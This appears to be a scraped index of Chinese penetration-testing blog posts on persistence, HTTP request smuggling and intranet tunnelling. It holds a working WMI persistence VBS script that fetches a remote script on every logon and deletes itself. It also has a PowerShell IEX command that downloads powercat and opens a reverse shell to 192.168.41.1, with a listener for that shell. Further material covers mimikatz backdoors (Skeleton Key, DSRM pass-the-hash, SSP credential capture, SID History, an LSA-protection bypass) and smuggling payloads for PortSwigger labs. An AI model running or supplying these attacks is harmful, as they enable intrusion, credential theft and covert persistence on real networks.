恶意VBS脚本。创建事件过滤器，捕获账户成功登陆的事件；创建活动脚本事件消费者，捕获到事件后执行远程脚本pnc.js;绑定过滤器和消费者。 nslink=\"winmgmts:\\\\.\\root\\subscription:\" qstr=\"select * from __InstanceCreationEvent within 5 \" '每5秒查询一次“实例创建事件”' qstr=qstr\u0026\"where targetinstance isa 'win32_NTLogEvent' and \" qstr=qstr\u0026\"targetinstance.EventCode='4624' \" '实例名是win32_NTLogEvent' set evtflt=getobject(nslink\u0026\"__EventFilter\").spawninstance_ '创建事件过滤器' evtflt.name=\"filtP1\" '定义过滤器的名字' evtflt.EventNameSpace=\"root\\cimv2\" evtflt.query=qstr '定义查询语句' evtflt.querylanguage=\"wql\" '定义查询语言(只能是wql)' set fltpath=evtflt.put_ '注册过滤器，返回其链接' set asec=getobject(nslink\u0026\"ActiveScriptEventConsumer\").spawninstance_ '创建“活动脚本事件消费者”' asec.name=\"consP1\" '定义消费者的名字' asec.scriptingengine=\"JScript\" '定义脚本语言 asec.ScriptText=\"GetObject(\"\"script:http://192.168.41.1:8080/pnc.js\"\")\" set asecpath=asec.put_ '注册消费者，返回其链接' set fcbnd=getobject(nslink\u0026\"__FilterToConsumerBinding\").spawninstance_ '创建过滤器和消费者的绑定' fcbnd.filter=fltpath.path '指定过滤器' fcbnd.consumer=asecpath.path '指定消费者' fcbnd.put_ '执行绑定' dim fso set fso = CreateObject(\"Scripting.FileSystemObject\") evilname=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,\"\\\")) evilname=evilname\u0026 fso.GetFile(Wscript.scriptfullname).name fso.DeleteFile(evilname) 'vbs删除自己 pnc.js -\u003e 服务端恶意脚本。下载powercat.ps1，并使用其返回shell。 \u003c?xml version=\"1.0\"?\u003e \u003cpackage\u003e \u003ccomponent id=\"testCalc\"\u003e \u003cscript language=\"JScript\"\u003e var r = new ActiveXObject(\"WScript.Shell\").Run(\"powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.41.1:8080/powercat-master/powercat.ps1');powercat -c 192.168.41.1 -p 6999 -e cmd\"); \u003c/script\u003e \u003c/component\u003e \u003c/package\u003e shell_server.py -\u003e 服务端监听shell的脚本。 import socket import re pattern = re.compile(r'[A-Z]:\\\\.*?\u003e') def recv_end(the_socket): total_data = [] data = b'' while True: data = the_socket.recv(1024) #print(data) if not data: raise ConnectionAbortedError data = str(data, encoding = 'gbk') total_data.append(data) if pattern.search(data, re.M): break if len(total_data) \u003e 1: last_pair = total_data[-2] + total_data[-1] if pattern.search(last_pair, re.M): break return ''.join(total_data) # 建立一个服务端 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) port = 6999 server.bind(('192.168.41.1', port)) #绑定要监听的端口 server.listen(5) #开始监听 表示可以使用五个链接排队 while True:# conn就是客户端链接过来而在服务端为期生成的一个链接实例 print('------------Listening on {}------------'.format(port)) conn, addr = server.accept() #等待链接,多个链接的时候就会出现问题,其实返回了两个值 print(conn) while True: try: se = input(recv_end(conn)) if not se: se = '\\r\\n' #print(bytes(se, encoding = \"utf8\")) conn.send(bytes(se, encoding = 'utf-8')) #然后再发送数据 except BaseException as e: print('\\n' + addr[0] + ':' + str(addr[1]) + '已关闭') break conn.close() # 关闭连接 powercat.ps1 -\u003e powershell版netcat。(https://github.com/besimorhino/powercat) clean.ps1 -\u003e 清除evil3.vbs创建的过滤器、消费者、绑定器。 #Filter Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='filtP1'\" | Remove-WmiObject -Verbose #Consumer Get-WMIObject -Namespace root\\Subscription -Class CommandLineEventConsumer -Filter \"Name='consP1'\" | Remove-WmiObject -Verbose #Binding Get-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding -Filter \"__Path LIKE '%filtP1%'\" | Remove-WmiObject -Verbose ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:4","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"2 域控后门 ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:0","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"2.1 DSRM 后门 DSRM(Directory Services Restore Mode) 是 Windows 域环境中域控制器的安全模式启动选项。每个域控制器有一个本地管理员账号(也就是 DSRM 账号)。DSRM 的用途是:允许管理员在域环境出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM 的密码需要在安装 DC 时设置，且很少会被重置。修改 DSRM 密码最基本的方法是在 DC 上运 ntdsutil 行命令。 在渗透测试中，可以使用 DSRM 账号对域环境进行持久化操作。如果域控制器的系统版本为 Windows Server 2008，则需要安装 KB96132 补丁才可以使用指定域账号的密码对 DSRM 的密码进行同步。在 Windows Server 2008 以后版本的系统中不需要安装此补丁。如果域控制器的系统版本为 Windows Server 2003，则不能使用该方法进行持久化操作。 我们知道，每个 DC 都有本地管理员(administrator)账号和密码。DSRM 账号可以作为 DC 的本地管理员用户，通过网络连接 DC，进而控制 DC。 在 DC 上，DSRM 账号的表现形式是本地的 administrator 用户，也就是说本地 administrator 用户 = DSRM 账号 2.1.1 修改 DSRM 密码的方法 微软公布了修改DSRM密码的方法。在域控上打开命令行环境，常用命令如下： # NTDSUTIL：打开ntdsutil set DSRM password # ：修改DSRM的密码 reset password on server null # 在当前域控制器上重置DSRM的密码 # q(第1次)：退出DSRM密码设置模式 # q(第2次)：退出ntdsutil 如果域控制器的系统版本为 Windows Server 2008(已安装KB961320)及以上，可以将 DSRM 密码同步为已存在的域账号密码。 NTDSUTIL # 打开ntdsutil set DSRM password # 修改 DSRM 的密码 sync from domain account # 域用户名字：使DSRM的密码和指定域用户的密码同步 # q(第1次) 退出DSRM密码设置模式 # q(第2次) 退出ntdsutil 2.1.2 设置 DSRM 后门 2.1.2.1 直接为 DSRM 设置新密码 为 DSRM 设置新密码，获取 NTLM 哈希值，修改 DSRM 登录方式，使用哈希传递攻击域控 查看 SAM 文件中本地管理员 administrator 的 NTLM 哈希值 privilege::debug token::elevate lsadump::sam 修改 DSRM 的登录方式 DSRM 有三种登录方式，具体如下： 0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号 1：只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器 2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器 在 Windows Server 2000 以后的版本操作系统中，对 DSRM 使用控制台登录域控制器进行了限制。如果要使用 DSRM 账号通过网络登录域控制器，需要将该值设置为 2。输入如下命令，可以使用 PowerShell 进行更改。 New-ItemProperty \"hklm:\\system\\currentcontrolset\\control\\lsa\\\" -name \"dsrmadminlogonbehavior\" -value 2 -propertyType DWORD 使用本地 administrator 账号哈希传递攻击域控 privilege::debug sekurlsa::pth /domain:DC /user:administrator /ntlm:0f0de1776a3bf0f2a29b6f15b6fcba42 2.1.2.2 将 DSRM 的密码同步为一个域用户的已知密码 其余方法同上。 ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:1","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"2.2 Skeleton Key 万能密码 Skeleton Key 被安装在 64 位的域控服务器上 支持 Windows Server2003 — Windows Server2012 R2 能够让所有域用户使用同一个万能密码进行登录 现有的所有域用户使用原密码仍能继续登录 重启后失效 使用 Skeleton Key 攻击时，NTLM、Kerberos 两种身份验证方法都会被篡改。 例如，在NTLM身份验证期间，已注入 LSASS 进程中的主密码哈希将不会与SAM数据库进行比较，而将与 Skeleton Key 哈希进行比较，因此，身份验证将成功。 Kerberos 加密也将降级为不支持 Salt（RC4_HMAC_MD5）的算法，并且从活动目录中检索到的哈希将替换为 Skeleton Key 哈希。 因此，主密码的哈希值将始终在服务器端进行验证，并且两种方法的身份验证都将成功。 2.2.1 在域控上安装 Skeleton Key mimikatz 命令： privilege::debug misc::skeleton 2.2.2 在域内主机使用 Skeleton Key 登录 net use \\\\dc.pentest.domain mimikatz /user:administrator@pentest.domain dir \\\\DC.pentest.domain\\c$ 2.2.3 权限测试 使用域内不存在的用户 + Skeleton Key 登录 无法登录 使用域内普通权限用户登录 使用域内普通权限用户无法访问域控 结论： Skeleton Key 只是给所有账户添加了一个万能密码，无法修改账户的权限 2.2.4 LSA Protection 微软在 2014 年 3 月 12 日添加了 LSA 保护策略，用来防止对进程 lsass.exe 的代码注入，这样一来就无法使用 mimikatz 对 lsass.exe 进行注入，相关操作也会失败。 适用系统： Windows 8.1 Windows Server 2012 R2 使用 Windows Server 2012 进行测试 2.2.4.1 配置 LSA Protection 注册表位置： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa 新建 DWORD 值，名称为：RunAsPPL ，数值为十六进制的 00000001 添加完毕后，需要重启系统 2.2.4.2 测试 LSA Protection 2.2.5 绕过 LSA Protection Mimikatz 命令： privilege::debug !+ !processprotect /process:lsass.exe /remove misc::skeleton ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:2","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"2.3 SSP 劫持 SSP SSP (Security Support Provider)，是 windows 操作系统安全机制的提供者。简单的说，SSP 就是 DLL 文件，主要用于 windows 操作系统的身份认证功能，例如 NTLM、 Kerberos、Negotiate、Secure Channel(Schannel)、 Digest、Credential(CredSSP) SSPI SSPI(Security Support Provider Interface)是 windows 操作系统在执行认证操作时使用的 API 接口。可以说 SSPI 就是 SSP 的 API 接口。 LSA Local Security Authority，用于身份认证，常见进程为 lsass.exe 如果获得目标系统 system 权限，可以使用该方法进行持久化操作。其主要原理是：LSA(Local Security Authority)用于身份验证。Isass.exe 作为 windows 的系统进程，用于本地安全和登录策略； 在系统启动时，SSP 将被加载到 lsass.exe 进程中。但是，假如攻击者对 LSA 进行了扩展，自定义了恶意的 DLL 文件在系统启动时将其加载到 lsass.exe 进程中，就能够获取 lsass.exe 进程中的明文密码。这样即使用户更改密码并重新登录，攻击者依然可以获得该账号的新密码。 2.3.1 mimilib SSP 由于是针对本机的 LSA 进行 Patch，因此本方法只针对在当前机器上登录的用户起作用 2.3.1.1 通过内存更新留后门（临时） privilege::debug misc::memssp 2.3.1.2 通过修改注册表留后门（永久） 使用此方法即使系统重启，也不会影响到持久化的效果 添加 mimilib.dll 到域控 C:\\windows\\system32 下 copy mimilib.dll %systemroot%\\system32 注： 64 位系统要用 64 位的 mimilib.dll，32 位的会失败 设置 SSP reg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v \"Security Packages\" reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ 重启系统 域控重启后在 c:\\windows\\system32 可看到新生成的文件 kiwissp.log ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:3","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"2.4 SID History 域后门 每个用户帐号都有一个关联的安全标识符（简称SID），SID 用于跟踪安全主体在访问资源时的帐户与访问权限。为了支持 AD 迁移，微软设计了 SID History 属性，SID History 允许另一个帐户的访问被有效的克隆到另一个帐户。通过 SID History 可让用户拥有不同身份的权限，在单域中同样有效。 SID History 是在域迁移过程中需要使用的一个属性。 如果将 A 域中的域用户迁移到 B 域中，那么在 B 域中该用户的 SID 会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。 SID History 的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的 SID 改变了，系统会将其原来的 SID 添加到迁移后用户的 SID History 属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。 使用 mimikatz，可以将 SID History 属性添加到域中任意用户的 SID History 属性中。在实战中，如果获得了域管理员权限，则可以将 SID History 作为实现持久化的方法。 2.4.1 添加 SID History 后门 打开一个具有域管理员权限的命令行窗口，然后打开 mimikatz，将 administrator 的 SID 添加到 hack 用户的 SID History 属性中。 需要注意的是，在使用 mimikatz 注入 SID 之前，需要使用 sid::patch 命令修复 NTDS 服务，否则无法将高权限的 SID 注入低权限用户的 SID History 属性 mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::add /new:administrator /sam:test\" \"exit\" # 将 administrator 的 SID 添加到 hack 的 SID History 属性中 2.4.2 查看 SID History Import-Module activedirectory Get-ADUser hack -Properties sidhistory 2.4.3 清除 SID History mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::clear /sam:test\" \"exit\" ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:4","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"2.5 Hook PasswordChangeNotify 2.5.1 背景 在修改域控密码时会进行如下同步操作： 当修改域控密码时，LSA 首先调用 PasswordFileter 来判断新密码是否符合密码复杂度要求 如果符合，LSA 接着调用 PasswordChangeNotify 在系统上同步更新密码 函数 PasswordChangeNotify 存在于 rassfm.dll rassfm.dll 可理解为 Remote Access Subauthentication dll，只存在于在 Server 系统下，xp、win7、win8 等均不存在 2.5.2 特点 不需要重启 不需要修改注册表 甚至不需要在系统放置dll 2.5.3 实现 2.5.3.1 Hook DLL 为 PasswordChangeNotify 创建一个 inline Hook，将初始函数重定向到 PasswordChangeNotifyHook 在 PasswordChangeNotifyHook 中实现记录密码的操作，然后重新将控制权交给 PasswordChangeNotify 2.5.3.2 DLL 注入 利用 Powershell tricks 中的 Process Injection 将我们自己编写的 dll 注入到 lsass 进程，实现 Hook 功能 https://github.com/3gstudent/Hook-PasswordChangeNotify 管理员权限执行： PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1 在 Server 2012 R2 x64 下，手动修改域控密码后 在 C:\\Windows\\Temp 下可以找到 passwords.txt，其中记录了新修改的密码 ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:5","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["渗透测试"],"content":"HTTP 请求走私","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"HTTP 请求走私 ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:0:0","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"1 前言 ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:1:0","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"1.1 Keep-Alive 在 HTTP 1.0 之前的协议设计中，客户端每进行一次 HTTP 请求，就需要同服务器建立一个 TCP 链接。而现代的 Web 网站页面是由多种资源组成的，我们要获取一个网页的内容，不仅要请求 HTML 文档，还有 JS、CSS、图片等各种各样的资源，这样如果按照之前的协议设计，就会导致 HTTP 服务器的负载开销增大。于是在 HTTP 1.1 中，增加了 Keep-Alive 和 Pipeline 这两个特性。 Keep-Alive 是什么？就是在 HTTP 请求中增加一个特殊的请求头 Connection: Keep-Alive，告诉服务器，接收完这次 HTTP 请求后，不要关闭 TCP 链接，后面对相同目标服务器的 HTTP 请求，重用这一个 TCP 链接，这样只需要进行一次 TCP 握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在 HTTP 1.1 中是默认开启的。 ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:1:1","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"1.2 Pipeline 有了 Keep-Alive 之后，后续就有了Pipeline，在这里呢，客户端可以像流水线一样发送自己的 HTTP 请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。现在，浏览器默认是不启用 Pipeline 的，但是一般的服务器都提供了对 Pipeline 的支持。 ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:1:2","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"1.3 原理 反向代理服务器与后端的源站服务器之间，会重用 TCP 链接，因为代理服务器与后端的源站服务器的 IP 地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，所以就顺理成章了。 但是由于两者服务器的实现方式不同，如果用户提交模糊的请求可能代理服务器认为这是一个 HTTP 请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分就是走私的请求了，这就是 HTTP 走私请求的由来。 HTTP 请求走私漏洞的原因是由于 HTTP 规范提供了两种不同方式来指定请求的结束位置，它们是 Content-Length 标头和 Transfer-Encoding 标头，Content-Length 标头简单明了，它以字节为单位指定消息内容体的长度。 Transfer-Encoding 标头用于指定消息体使用分块编码（Chunked Encode），也就是说消息报文由一个或多个数据块组成，每个数据块大小以字节为单位（十六进制表示） 衡量，后跟换行符，然后是块内容，最重要的是：整个消息体以大小为 0 的块结束，也就是说解析遇到 0 数据块就结束。如： POST / HTTP/1.1 Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked b a=11 0 其实理解起来真的很简单，相当于我发送请求，包含Content-Length，前端服务器解析后没有问题发送给后端服务器，但是我在请求时后面还包含了Transfer-Encoding，这样后端服务器进行解析便可执行我写在下面的一些命令，这样便可以绕过前端的 waf。 ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:1:3","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"2 实例 ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:0","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"2.1 CL 不为 0 的 GET 请求 假设前端代理服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉 GET 请求中的 Content-Length 头，不进行处理。这就有可能导致请求走私。 比如我们构造请求： GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 44\\r\\n GET / secret HTTP/1.1\\r\\n Host: example.com\\r\\n \\r\\n 前端服务器收到该请求，通过读取 Content-Length，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对 Content-Length 进行处理，由于 Pipeline 的存在，它就认为这是收到了两个请求，分别是 # 第一个 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n # 第二个 GET /secret HTTP/1.1\\r\\n Host: example.com\\r\\n ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:1","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"2.2 CL-CL 在 RFC7230 的第 3.3.3 节中的第四条中，规定当服务器收到的请求中包含两个 Content-Length，而且两者的值不同时，需要返回 400 错误。 但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回 400 错误，但是中间代理服务器按照第一个 Content-Length 的值对请求进行处理，而后端源站服务器按照第二个 Content-Length 的值进行处理。 此时恶意攻击者可以构造一个特殊的请求： POST / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 8\\r\\n Content-Length: 7\\r\\n 12345\\r\\n a 中间代理服务器获取到的数据包的长度为 8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为 7。当读取完前 7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母 a，对于后端服务器来说，这个 a 是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其它的正常用户对服务器进行了请求，假设请求如图所示： GET /index.html HTTP/1.1\\r\\n Host: example.com\\r\\n 从前面我们也知道了，代理服务器与源站服务器之间一般会重用 TCP 连接。 这时候正常用户的请求就拼接到了字母 a 的后面，当后端服务器接收完毕后，它实际处理的请求其实是： aGET /index.html HTTP/1.1\\r\\n Host: example.com\\r\\n 这时候用户就会收到一个类似于 aGET request method not found 的报错。这样就实现了一次 HTTP 走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于 CSRF 的攻击方式。 但是两个 Content-Length 这种请求包还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。但是在 RFC2616 的第 4.4 节中，规定:如果收到同时存在 Content-Length 和 Transfer-Encoding 这两个请求头的请求包时，在处理的时候必须忽略 Content-Length，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回 400 错误。服务器在这里的实现更容易出问题。 ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:2","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"2.3 CL-TE 所谓CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理 Content-Length 这一请求头，而后端服务器会遵守 RFC2616 的规定，忽略掉 Content-Length，处理 Transfer-Encoding 这一请求头。 chunk 传输数据格式如下，其中 size 的值由 16 进制表示。 Lab 地址：https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te 构造数据包： POST / HTTP/1.1\\r\\n Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\\r\\n Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n Accept-Language: en-US,en;q=0.5\\r\\n Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\\r\\n Connection: keep-alive\\r\\n Content-Length: 6\\r\\n Transfer-Encoding: chunked\\r\\n \\r\\n 0\\r\\n \\r\\n G 连续发送几次请求就可以获得该响应： ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:3","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"2.4 TE-CL 所谓 TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理 Transfer-Encoding 这一请求头，而后端服务器处理 Content-Length 请求头。 Lab地址：https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl 构造数据包： POST / HTTP/1.1\\r\\n Host: ac041f531eabd0cd804edb62000c0025.web-security-academy.net\\r\\n Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n Accept-Language: en-US,en;q=0.5\\r\\n Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\\r\\n Content-Length: 4\\r\\n Transfer-Encoding: chunked\\r\\n \\r\\n 12\\r\\n GPOST / HTTP/1.1\\r\\n \\r\\n 0\\r\\n \\r\\n 由于前端服务器处理 Transfer-Encoding，当其读取到 0\\r\\n\\r\\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理 Content-Length 请求头，当它读取完 5c\\r\\n 之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是： GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:4","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["渗透测试"],"content":"2.5 TE-TE TE-TE，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理 Transfer-Encoding 请求头，这确实是实现了 RFC 的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的 Transfer-Encoding 进行某种混淆操作，从而使其中一个服务器不处理 Transfer-Encoding 请求头。从某种意义上还是 CL-TE 或者 TE-CL。 Lab地址：https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header 构造数据包： POST / HTTP/1.1\\r\\n Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\\r\\n User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\n Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n Accept-Language: en-US,en;q=0.5\\r\\n Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\\r\\n Content-length: 4\\r\\n Transfer-Encoding: chunked\\r\\n Transfer-encoding: cow\\r\\n \\r\\n 5c\\r\\n GPOST / HTTP/1.1\\r\\n Content-Type: application/x-www-form-urlencoded\\r\\n Content-Length: 15\\r\\n \\r\\n x=1\\r\\n 0\\r\\n \\r\\n ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:5","tags":["渗透测试"],"title":"HTTP 请求走私","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["内网渗透"],"content":"内网隧道穿透","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"内网隧道穿透 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:0:0","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"1 场景介绍 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:1:0","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"1.1 相关概念 内网穿透是：利用各种隧道技术，寻找防火墙允许的协议，混杂在正常流量中穿透，绕过网络防火墙的封锁，实现访问被封锁的目标网络。 被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。 隧道协议的主要作用包括：规避防火墙、加密网络流量。 常见的隧道列举如下： 应用层：SSH、HTTP、HTTPS、DNS。 传输层：TCP、UDP、常规端口转发。 网络层：IPv6、ICMP、GRE。 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:1:1","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"1.2 正向代理 \u0026 反向代理 正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。 1.2.1 正向代理 Lhost -\u003e proxy -\u003e Rhost Lhost 为了访问到 Rhost，向 proxy 发送了一个请求并且指定目标是 Rhost，然后 proxy 向 Rhost 转交请求并将获得的内容返回给 Lhost，简单来说正向代理就是 proxy 代替了我们去访问 Rhost。 1.2.2 反向代理 Lhost \u003c----\u003e proxy 